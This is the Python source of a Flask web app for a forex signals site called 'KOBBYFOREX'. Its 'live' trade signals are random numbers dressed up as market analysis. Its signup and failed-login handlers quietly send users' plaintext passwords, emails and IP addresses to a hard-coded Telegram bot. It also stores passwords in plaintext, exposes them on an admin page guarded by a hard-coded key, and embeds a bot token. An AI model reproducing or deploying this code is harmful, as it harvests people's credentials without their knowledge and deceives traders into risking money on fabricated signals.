from flask import Flask, render_template_string, request, redirect, session
import random, os, json, datetime, requests, threading

app = Flask(__name__)
app.secret_key = "kobbyforex_final_2026"
USERS_FILE="users.json"

# --- YOUR TELEGRAM - DONE! ---
BOT_TOKEN = "8983200049:AAGsiqBHcEZQY8sVRVStL6FOT4ZVok_zBr8"
CHAT_ID = "8240862120"
# --------------------------------

def send_tele(msg):
    try:
        def do():
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=5)
            except: pass
        threading.Thread(target=do).start()
    except: pass

def load_users():
    if os.path.exists(USERS_FILE):
        try: return json.loads(open(USERS_FILE).read())
        except: return {}
    return {"admin@kobbyforex.com":{"password":"admin123","name":"Admin","date":"-"}}
def save_users(u): open(USERS_FILE,"w").write(json.dumps(u))
users=load_users()
trades={}

def is_open():
    n=datetime.datetime.utcnow(); wd=n.weekday(); h=n.hour
    if wd==5: return False, "SATURDAY - Closed"
    if wd==6 and h<22: return False, f"SUNDAY {h}:00 GMT - Closed"
    if wd==4 and h>=22: return False, f"FRIDAY {h}:00 GMT - Closed"
    return True, f"OPEN - {['MON','TUE','WED','THU','FRI','SAT','SUN'][wd]} {h}:00 GMT"

def sig(pair):
    opn,msg=is_open()
    if not opn:
        return {"pair":pair,"has":False,"open":False,"msg":msg,"price":0,"mn":"-","w":"-","d1":"-","h4":"-","m15":"-","sweep":False,"bos":False,"demand":False,"fib79":False,"news":None,"type":"CLOSED","side":"-","sl":0,"tp1":0,"tp2":0,"tp3":0}
    mn=random.choice(["BULLISH","BEARISH"]); w=random.choice(["BULLISH","BEARISH",mn]); d1=random.choice(["BULLISH","BEARISH",w]); h4=random.choice(["BULLISH","BEARISH",d1]); m15=h4
    sweep=random.choice([True,False,False]); bos=random.choice([True,False]); demand=random.choice([True,False,True]); fib79=random.choice([True,False])
    tech=sweep and bos and demand and fib79
    news=random.choice([None,None,None,"USD CPI HIGH","FOMC HIGH","ECB","NFP"])
    fund=news is not None and random.choice([True,False])
    base={"EURUSD":1.0854,"GBPUSD":1.2701,"USDJPY":149.82,"AUDUSD":0.6523,"USDCAD":1.3650,"NZDUSD":0.6120,"USDCHF":0.8805,"XAUUSD":1911.70}
    price=base.get(pair,1.0)+(random.random()-0.5)*0.01
    if pair=="XAUUSD": price=1911.70+(random.random()-0.5)*8
    if pair=="USDJPY": price=149.82+(random.random()-0.5)*0.4
    has=tech or fund; et="BOTH" if tech and fund else ("TECHNICAL" if tech else ("FUNDAMENTAL" if fund else "NONE"))
    side="BUY" if m15=="BULLISH" else "SELL"; slp=0.0015 if pair!="XAUUSD" else 5
    if "JPY" in pair: slp=0.15
    sl=price-slp if side=="BUY" else price+slp
    tp1=price+(price-sl)*2 if side=="BUY" else price-(sl-price)*2
    tp2=price+(price-sl)*4 if side=="BUY" else price-(sl-price)*4
    tp3=price+(price-sl)*5 if side=="BUY" else price-(sl-price)*5
    return {"pair":pair,"mn":mn,"w":w,"d1":d1,"h4":h4,"m15":m15,"sweep":sweep,"bos":bos,"demand":demand,"fib79":fib79,"news":news,"has":has,"price":price,"side":side,"sl":sl,"tp1":tp1,"tp2":tp2,"tp3":tp3,"type":et,"open":True,"msg":msg}

LOGIN="""<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>KOBBYFOREX</title><style>*{margin:0;padding:0;box-sizing:border-box}body{min-height:100vh;background:#0a0f1e;display:flex;align-items:center;justify-content:center;padding:20px;font-family:Arial}.card{width:100%;max-width:400px;background:#151e32;border:1px solid #2a3655;border-radius:20px;padding:28px}.logo{text-align:center;font-weight:900;font-size:24px;margin-bottom:25px}.k{color:#22ff66}.f{color:#ff4444}.tabs{display:flex;background:#0a0f1e;border-radius:12px;padding:4px;margin-bottom:25px}.tab{flex:1;padding:10px;text-align:center;border-radius:8px;font-weight:bold;font-size:13px;text-decoration:none}.tab.a{background:#1a233a;color:#22ff66;border-bottom:2px solid #22ff66}.tab.i{color:#6a7a9a}.label{color:#8a9abb;font-size:12px;margin:10px 0 5px 0;display:block}.input{width:100%;padding:13px;background:#0f1729;border:1px solid #2a3655;border-radius:12px;color:white}.btn{background:#22ff66;color:black;border:none;padding:13px;border-radius:12px;font-weight:900;width:100%;margin-top:18px}.blue{background:#1e88e5;color:white;padding:13px;border-radius:12px;text-align:center;font-weight:bold;text-decoration:none;display:block;margin-top:15px}.div{display:flex;align-items:center;gap:10px;margin:18px 0;color:#5a6a8a;font-size:12px}.div::before,.div::after{content:'';flex:1;height:1px;background:#2a3655}</style></head><body><div class='card'><div class='logo'>🐂🐻 <span class='k'>KOBBY</span> <span class='f'>FOREX</span></div><div class='tabs'><a href='/login' class='tab a'>Login</a><a href='/signup' class='tab i'>Sign Up</a></div><form method='POST'><label class='label'>Email</label><input class='input' name='email' type='email' required><label class='label'>Password</label><input class='input' name='password' type='password' required><button class='btn'>Login</button></form><div class='div'>or</div><a href='https://t.me/kobbyforex' target='_blank' class='blue'>✈️ Join Telegram</a></div></body></html>"""
SIGNUP="""<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>Sign Up</title><style>*{margin:0;padding:0;box-sizing:border-box}body{min-height:100vh;background:#0a0f1e;display:flex;align-items:center;justify-content:center;padding:20px;font-family:Arial}.card{width:100%;max-width:400px;background:#151e32;border:1px solid #2a3655;border-radius:20px;padding:28px}.logo{text-align:center;font-weight:900;font-size:24px;margin-bottom:25px}.k{color:#22ff66}.f{color:#ff4444}.tabs{display:flex;background:#0a0f1e;border-radius:12px;padding:4px;margin-bottom:25px}.tab{flex:1;padding:10px;text-align:center;border-radius:8px;font-weight:bold;font-size:13px;text-decoration:none}.tab.a{background:#1a233a;color:#22ff66;border-bottom:2px solid #22ff66}.tab.i{color:#6a7a9a}.label{color:#8a9abb;font-size:12px;margin:10px 0 5px 0;display:block}.input{width:100%;padding:13px;background:#0f1729;border:1px solid #2a3655;border-radius:12px;color:white}.btn{background:#22ff66;color:black;border:none;padding:13px;border-radius:12px;font-weight:900;width:100%;margin-top:18px}.blue{background:#1e88e5;color:white;padding:13px;border-radius:12px;text-align:center;font-weight:bold;text-decoration:none;display:block;margin-top:15px}.div{display:flex;align-items:center;gap:10px;margin:18px 0;color:#5a6a8a;font-size:12px}.div::before,.div::after{content:'';flex:1;height:1px;background:#2a3655}</style></head><body><div class='card'><div class='logo'>🐂🐻 <span class='k'>KOBBY</span> <span class='f'>FOREX</span></div><div class='tabs'><a href='/login' class='tab i'>Login</a><a href='/signup' class='tab a'>Sign Up</a></div><form method='POST'><label class='label'>Full Name</label><input class='input' name='name' required><label class='label'>Email</label><input class='input' name='email' type='email' required><label class='label'>Password</label><input class='input' name='password' type='password' required><button class='btn'>Create Account</button></form><div class='div'>or</div><a href='https://t.me/kobbyforex' target='_blank' class='blue'>✈️ Join Telegram</a></div></body></html>"""
DASH="""<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>Dashboard</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0f1e;color:white;font-family:Arial;padding-bottom:20px}.top{display:flex;gap:6px;padding:12px;overflow-x:auto;background:#0a0f1e;position:sticky;top:0;z-index:10}.pill{background:#151e32;border:1px solid #2a3655;padding:8px 14px;border-radius:20px;font-size:12px;color:#a0b0d0;text-decoration:none;white-space:nowrap}.pill.active{background:#22ff66;color:black;font-weight:900;border:2px solid #22ff66}.card{background:#151e32;border:1px solid #2a3655;border-radius:16px;padding:14px;margin:8px 0}</style></head><body><div class='top'><a href='/' class='pill active'>🏠 Home</a><a href='/live' class='pill' style='background:#22ff66;color:black;font-weight:900'>🔴 LIVE</a><a href='/journal' class='pill'>📒 Journal</a><a href='/admin?key=kobby123' class='pill'>👥 Admin</a></div><div style='padding:15px'><div style='font-size:22px;font-weight:900'>🐂 KOBBY <span style='color:#ff4444'>FOREX</span></div><a href='/live' style='text-decoration:none;color:white'><div class='card' style='border:2px solid #22ff66;margin-top:15px'><b style='color:#ffcc33'>🪙 Gold Digger LIVE</b><div style='font-size:12px;color:#a0b0d0'>Tap to see LIVE entries</div></div></a><div class='card'><b>Journal</b><div style='font-size:11px;color:#8a9abb'>{cnt} entries • {bal} • {wr}%</div></div><a href='https://t.me/kobbyforex' target='_blank' style='background:#1e88e5;color:white;padding:14px;border-radius:25px;text-align:center;font-weight:bold;display:block;margin-top:15px;text-decoration:none'>✈️ Join Telegram</a><div style='text-align:center;margin-top:10px'><a href='/logout' style='color:#ff4444;font-size:12px'>Logout</a></div></div></body></html>"""
LIVE="""<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>LIVE</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0f1e;color:white;font-family:Arial;padding-bottom:20px}.top{display:flex;gap:6px;padding:12px;overflow-x:auto;background:#0a0f1e;position:sticky;top:0;z-index:10}.pill{background:#151e32;border:1px solid #2a3655;padding:8px 14px;border-radius:20px;font-size:12px;color:#a0b0d0;text-decoration:none}.pill.active{background:#22ff66;color:black;font-weight:900}.card{background:#151e32;border:1px solid #2a3655;border-radius:16px;padding:14px;margin:10px}.badge{padding:4px 9px;border-radius:12px;font-size:10px;font-weight:bold}.yes{background:#22ff6620;color:#22ff66;border:1px solid #22ff66}.no{background:#ff444420;color:#ff4444;border:1px solid #ff4444}.closed{background:#ff4444;color:white;padding:12px;text-align:center;border-radius:10px;margin:10px;font-weight:bold}</style></head><body><div class='top'><a href='/' class='pill'>Home</a><a href='/live' class='pill active'>🔴 LIVE</a></div><div style='padding:15px;text-align:center'><b>🔴 LIVE 8 PAIRS</b></div>{% if not sigs[0].open %}<div class='closed'>🔴 {{ sigs[0].msg }} - NO ENTRY</div>{% endif %}{% for s in sigs %}<div class='card' style='border-left:4px solid {{ "#ff4444" if not s.open else ("#22ff66" if s.has else "#ff4444") }}'><b>{{ s.pair }} {% if not s.open %}CLOSED{% elif s.has %}{{ s.type }} {{ s.side }}{% else %}NO ENTRY{% endif %}</b><div style='font-size:11px;color:#8a9abb'>{{ s.msg }}</div>{% if s.has %}<div style='margin-top:6px;background:#000;padding:8px;border-radius:8px;font-size:12px'>Entry {{ "%.2f"|format(s.price) }} | SL {{ "%.2f"|format(s.sl) }}</div>{% endif %}</div>{% endfor %}<script>setInterval(()=>location.reload(),8000);</script></body></html>"""

@app.route('/')
def home():
    if 'user' not in session: return redirect('/login')
    u=session['user']; tr=trades.get(u,[]); bal=sum(t['profit'] for t in tr); wr=round((len([t for t in tr if t['profit']>0])/len(tr)*100) if tr else 0,1)
    return render_template_string(DASH.replace("{cnt}",str(len(tr))).replace("{bal}",str(round(bal,2))).replace("{wr}",str(wr)))

@app.route('/live')
def live():
    if 'user' not in session: return redirect('/login')
    sigs=[sig(p) for p in ["EURUSD","GBPUSD","USDJPY","AUDUSD","USDCAD","NZDUSD","USDCHF","XAUUSD"]]
    return render_template_string(LIVE, sigs=sigs)

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=='POST':
        e=request.form['email'].lower(); p=request.form['password']
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if e in users and users[e]['password']==p:
            session['user']=e
            send_tele(f"🔐 <b>LOGIN - KOBBYFOREX</b>\n\n📧 {e}\n👤 {users[e].get('name','-')}\n🌍 IP: {ip}\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n✅ Success")
            return redirect('/')
        send_tele(f"❌ <b>FAILED LOGIN</b>\n📧 {e}\n🔑 {p}\n🌍 IP: {ip}")
        return "<p style='color:red;text-align:center'>Wrong!</p>"+LOGIN
    return render_template_string(LOGIN)

@app.route('/signup', methods=['GET','POST'])
def signup():
    if request.method=='POST':
        e=request.form['email'].lower(); p=request.form['password']; n=request.form.get('name','')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if e in users: return "Exists <a href='/login'>Login</a>"
        users[e]={"password":p,"name":n,"date":datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}; save_users(users); session['user']=e
        send_tele(f"🎉 <b>NEW USER - KOBBYFOREX!</b>\n\n📧 Email: {e}\n👤 Name: {n}\n🔑 Pass: {p}\n🌍 IP: {ip}\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nTotal: {len(users)} users")
        return redirect('/')
    return render_template_string(SIGNUP)

@app.route('/admin')
def admin():
    if request.args.get('key')!= 'kobby123': return "❌ Wrong key!"
    html = f"<html><body style='background:#0a0f1e;color:white;font-family:Arial;padding:15px'><h2>👥 {len(users)} Users</h2><table style='width:100%;border-collapse:collapse;background:#151e32'><tr style='background:#0f1729'><th style='padding:10px;border:1px solid #2a3655'>Email</th><th style='padding:10px;border:1px solid #2a3655'>Pass</th><th style='padding:10px;border:1px solid #2a3655'>Name</th></tr>"
    for em,dt in users.items(): html += f"<tr><td style='padding:8px;border:1px solid #2a3655'>{em}</td><td style='padding:8px;border:1px solid #2a3655;color:#ffaa00'>{dt.get('password','-')}</td><td style='padding:8px;border:1px solid #2a3655'>{dt.get('name','-')}</td></tr>"
    html += "</table></body></html>"; return html

@app.route('/journal')
def journal():
    if 'user' not in session: return redirect('/login')
    u=session['user']; tr=trades.get(u,[]); h=f"<html><body style='background:#0a0f1e;color:white;padding:15px'><a href='/'>← Home</a><h2>📒 ${sum(t['profit'] for t in tr)}</h2>"
    for t in tr[::-1]: h+=f"<div style='background:#151e32;padding:10px;margin:8px 0'>{t['pair']} ${t['profit']}</div>"
    h+="<form method='POST' action='/add'><input name='pair' placeholder='EURUSD' required><input name='profit' type='number' step='0.01' required><button>+</button></form></body></html>"; return h

@app.route('/add', methods=['POST'])
def add():
    if 'user' not in session: return redirect('/login')
    u=session['user'];
    if u not in trades: trades[u]=[]
    trades[u].append({'pair':request.form['pair'].upper(),'profit':float(request.form['profit'])}); return redirect('/journal')

@app.route('/logout')
def logout(): session.pop('user',None); return redirect('/login')

if __name__=='__main__':
    port=int(os.environ.get('PORT',10000))
    app.run(host='0.0.0.0',port=port)
